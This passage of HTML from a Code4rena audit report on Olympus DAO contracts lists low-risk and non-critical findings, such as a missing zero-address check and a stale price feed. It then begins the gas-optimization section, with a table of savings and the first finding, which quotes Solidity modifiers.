class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"l-09-heart-if-the-issuereward-fails-the-heart-beat-will-revert\" style=\"position:relative;\"><a href=\"#l-09-heart-if-the-issuereward-fails-the-heart-beat-will-revert\" aria-label=\"l 09 heart if the issuereward fails the heart beat will revert permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-09] Heart: if the issueReward fails the heart beat will revert</h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106</a></li>\n</ul>\n<p>If the <code>_issueReward</code> reverts, for example, because the token balance is too low, the <code>beat</code> will as well revert, due to the <code>safeTransfer</code>. One might consider not to revert even in the case the <code>_issueReward</code> reverts.</p>\n<h2 id=\"n-01-kernel-missing-zero-address-check-for-executor-and-admin\" style=\"position:relative;\"><a href=\"#n-01-kernel-missing-zero-address-check-for-executor-and-admin\" aria-label=\"n 01 kernel missing zero address check for executor and admin permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] Kernel: missing zero address check for <code>executor</code> and <code>admin</code></h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L250-L253\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L250-L253</a></li>\n</ul>\n<p>The <code>executor</code> and <code>admin</code> are not checked for the zero address when set by the <code>Kernel::executeAction</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Kernel::executeAction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">250</span><span class=\"mtk1\">         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">action_</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">Actions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ChangeExecutor</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">251</span><span class=\"mtk1\">             </span><span class=\"mtk12\">executor</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">target_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">action_</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">Actions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ChangeAdmin</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">253</span><span class=\"mtk1\">             </span><span class=\"mtk12\">admin</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">target_</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"n-02-instr-governance-upon-modules-upgrade-all-instruction-data-should-be-carried-over-to-the-new-modules\" style=\"position:relative;\"><a href=\"#n-02-instr-governance-upon-modules-upgrade-all-instruction-data-should-be-carried-over-to-the-new-modules\" aria-label=\"n 02 instr governance upon modules upgrade all instruction data should be carried over to the new modules permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] INSTR, Governance: upon module’s upgrade, all instruction data should be carried over to the new modules</h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L187\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L187</a></li>\n</ul>\n<p>The <code>Governance</code>’s logic will break if the <code>INSTR</code> module is upgraded to a new contract without having the same instructions data,  since the <code>proposalId</code>’s the <code>Governance</code> is using are bound to the <code>INSTR</code> module.</p>\n<h2 id=\"n-03-range-price-unused-import-of-fullmath\" style=\"position:relative;\"><a href=\"#n-03-range-price-unused-import-of-fullmath\" aria-label=\"n 03 range price unused import of fullmath permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] RANGE, PRICE: unused import of <code>FullMath</code></h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L18\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L18</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L23\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L23</a></li>\n</ul>\n<p>The modules <code>RANGE</code> and <code>PRICE</code> imports <code>FullMath</code>, but it is not used.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// modules/PRICE.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">22</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OlympusPrice</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Module</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">23</span><span class=\"mtk1\">     </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FullMath</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"n-04-price-stale-price\" style=\"position:relative;\"><a href=\"#n-04-price-stale-price\" aria-label=\"n 04 price stale price permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-04] PRICE: stale price</h2>\n<p>There is no indicator whether the price information is up-to-date. If the price information is not properly updated, the other contracts will keep using the data resulting in incorrect prices for swap.</p>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 91 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/39\">report highlighted below</a> by <strong>pfapostol</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/249\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/135\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/46\">LeoS</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/146\">Tomo</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/438\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/471\">m_Rassska</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/453\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/44\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/156\">gogo</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/269\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/324\">ret2basic</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/449\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/437\">ajtra</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/498\">JC</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/263\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/296\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/167\">ignacio</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/462\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/140\">grGred</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/196\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/4\">0xkatana</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/232\">Sm4rty</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/501\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/6\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/16\">robee</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/319\">0x040</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/19\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/312\">exolorkistis</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/60\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/29\">durianSausage</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/5\">erictee</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/190\">martin</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/128\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/96\">zishansami</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/361\">Rohan16</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/491\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/59\">Dionysus</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/385\">tnevler</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/377\">GalloDaSballo</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/432\">StevenL</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/21\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/237\">CertoraInc</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/58\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/119\">jag</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/133\">ElKu</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/354\">lukris02</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/218\">0xDjango</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/481\">medikko</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/24\">Noah3o6</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/147\">Saintcode_</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/241\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/139\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/291\">chrisdior4</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/398\">Amithuddar</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/251\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/164\">bobirichman</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/48\">cRat1st0s</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/182\">Guardian</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/289\">0x85102</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/174\">Shishigami</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/145\">Metatron</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/181\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/108\">0xNineDec</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/306\">Waze</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/10\">RoiEvenHaim</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/294\">Chandr</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/459\">apostle0x01</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/435\">Funen</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/478\">d3e4</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/480\">natzuu</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/31\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/68\">djxploit</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/417\">peiw</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/230\">JansenC</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/310\">karanctf</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/330\">kris</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/41\">simon135</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/158\">Tagir2003</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/443\">Diraco</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/359\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/401\">SooYa</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/455\">rokinot</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/73\">ne0n</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/152\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/323\">The_GUILD</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/3\">newfork01</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/26\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/161\">sikorico</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/456\">Fitraldys</a>, and <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/488\">hyh</a>.</em></p>\n<h2 id=\"summary-2\" style=\"position:relative;\"><a href=\"#summary-2\" aria-label=\"summary 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<p>Gas savings are estimated using the gas report of existing <code>FORGE_GAS_REPORT=true forge test</code> tests (the sum of all deployment costs and the sum of the costs of calling all methods) and may vary depending on the implementation of the fix. I keep my version of the fix for each finding and can provide them if you need.<br>\nSome optimizations (mostly logical) cannot be scored with a exact gas quantity.</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Estimated gas(deployments)</th>\n<th align=\"center\">Estimated gas(method call)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\"><strong>G‑01</strong></td>\n<td align=\"left\">Replace <code>modifier</code> with <code>function</code></td>\n<td align=\"center\">6</td>\n<td align=\"center\">460 154</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-02</strong></td>\n<td align=\"left\"><code>storage</code> pointer to a structure is cheaper than copying each value of the structure into <code>memory</code>, same for <code>array</code> and <code>mapping</code></td>\n<td align=\"center\">7</td>\n<td align=\"center\">188 639</td>\n<td align=\"center\">5 032</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-03</strong></td>\n<td align=\"left\">Using <code>private</code> rather than <code>public</code> for constants, saves gas</td>\n<td align=\"center\">8</td>\n<td align=\"center\">45 857</td>\n<td align=\"center\">308</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-04</strong></td>\n<td align=\"left\">Use elementary types or a user-defined <code>type</code> instead of a <code>struct</code> that has only one member</td>\n<td align=\"center\">1</td>\n<td align=\"center\">30 714</td>\n<td align=\"center\">1 037</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-05</strong></td>\n<td align=\"left\">State variables should be cached in stack variables rather than re-reading them from storage</td>\n<td align=\"center\">7</td>\n<td align=\"center\">24 021</td>\n<td align=\"center\">614</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-06</strong></td>\n<td align=\"left\">Using bools for storage incurs overhead</td>\n<td align=\"center\">6</td>\n<td align=\"center\">23 611</td>\n<td align=\"center\">4 485</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-07</strong></td>\n<td align=\"left\">State variables can be packed into fewer storage slots</td>\n<td align=\"center\">3</td>\n<td align=\"center\">23 292</td>\n<td align=\"center\">1 711</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-08</strong></td>\n<td align=\"left\">Expressions that cannot be overflowed can be unchecked</td>\n<td align=\"center\">5</td>\n<td align=\"center\">23 016</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-09</strong></td>\n<td align=\"left\">Increment optimization</td>\n<td align=\"center\">18</td>\n<td align=\"center\">↓</td>\n<td align=\"center\">↓</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-09.1</strong></td>\n<td align=\"left\">Prefix increments are cheaper than postfix increments, especially when it’s used in for-loops</td>\n<td align=\"center\">3</td>\n<td align=\"center\">400</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G‑09.2</strong></td>\n<td align=\"left\"><code>&#x3C;x> = &#x3C;x> + 1</code> even more efficient than pre increment</td>\n<td align=\"center\">18</td>\n<td align=\"center\">14 217</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-10</strong></td>\n<td align=\"left\">Use named <code>returns</code> for local variables where it is possible</td>\n<td align=\"center\">3</td>\n<td align=\"center\">5 400</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-11</strong></td>\n<td align=\"left\"><code>x = x + y</code> is cheaper than <code>x += y;</code></td>\n<td align=\"center\">6</td>\n<td align=\"center\">5 000</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-12</strong></td>\n<td align=\"left\">Deleting a struct is cheaper than creating a new struct with null values.</td>\n<td align=\"center\">1</td>\n<td align=\"center\">4 207</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G-13</strong></td>\n<td align=\"left\">Don’t compare boolean expressions to boolean literals</td>\n<td align=\"center\">2</td>\n<td align=\"center\">1 607</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G‑14</strong></td>\n<td align=\"left\"><code>revert</code> operator should be in the code as early as reasonably possible</td>\n<td align=\"center\">3</td>\n<td align=\"center\">200</td>\n<td align=\"center\">1 559+</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G‑15</strong></td>\n<td align=\"left\">Duplicated require()/revert() checks should be refactored to a modifier or function</td>\n<td align=\"center\">4</td>\n<td align=\"center\">-</td>\n<td align=\"center\">8 111</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Total: 83 instances over 15 issues</strong></p>\n<hr>\n<h2 id=\"g-01--replace-modifier-with-function-6-instances\" style=\"position:relative;\"><a href=\"#g-01--replace-modifier-with-function-6-instances\" aria-label=\"g 01  replace modifier with function 6 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01]  Replace <code>modifier</code> with <code>function</code> (6 instances)</h2>\n<p>Modifiers make code more elegant, but cost more than normal functions.</p>\n<p>Deployment Gas Saved: <strong>460 154</strong></p>\n<p>All modifiers except <code>permissioned</code> due to unresolved error flow.</p>\n<ul>\n<li>src/Kernel.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L70-L73\">70-73</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L119-L123\">119-123</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L223-L232\">223-232</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">     </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyKernel</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">kernel</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">KernelAdapter_OnlyKernel</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">         </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">    </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">role_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Role</span><span class=\"mtk1\"> </span><span class=\"mtk12\">role</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">toRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">role_</span><span class=\"mtk1\">);</span></span></span>\n<span 